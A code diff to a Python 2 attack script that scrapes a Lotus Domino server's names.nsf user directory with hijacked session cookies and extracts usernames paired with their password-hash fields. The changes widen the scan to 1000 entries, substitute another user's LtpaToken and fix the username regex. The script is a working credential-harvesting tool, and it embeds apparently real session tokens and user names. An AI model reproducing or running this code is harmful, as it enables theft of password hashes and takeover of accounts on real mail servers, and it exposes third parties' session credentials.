@@ -31,13 +31,12 @@ def banner():
 
 def lotus(url):
 
-    for x in xrange(1,100,19):
+    for x in xrange(1,1000,19):
 
         base_url = "{0}/names.nsf/$users?OpenView&Start={1}".format(url, x)
 
         # set cookies 
-        cookies = {"myusername": "heyunan", "DomAuthSessId": "9DA4DD6A5A359134437E9BB2DB9D676A", "userlogin": "CN%3D%u4F55%u96E8%u5357/O%3DZGTJ"}
-
+        cookies = {"myusername": "liutao", "LtpaToken": "AAECAzVCNzkyNUI4NUI3OTVERjhDTj0TwfUTzM4vTz1jcjE4ZxTqCOTD3y0xWOGmI+hHBhsjy8g+"}
         headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://baidu.com/names.nsf/$users?OpenView&Start=39", "Accept-Language": "zh-CN,zh;q=0.9", "If-Modified-Since": "Mon, 22 Jan 2018 04:11:17 GMT", "Connection": "close"}
 
         try:
@@ -46,12 +45,12 @@ def lotus(url):
             print "[x] Url is error or not set Cookie !!!"
             exit(1)
 
-        re_user = re.compile(r'<font size="2">mail\\(.*?)</font>')
+        re_user = re.compile(r'<font size="2">mail/(.*?)</font>')
         re_pass = re.compile(r'<font size="2">\((.*?)</font>')
 
         re_user_list = re_user.findall(r.content)
         re_pass_list = re_pass.findall(r.content)
-
+ 
         for x in xrange(len(re_user_list)):
             try:
                 user_pass = re_user_list[x] + ':(' + re_pass_list[x]
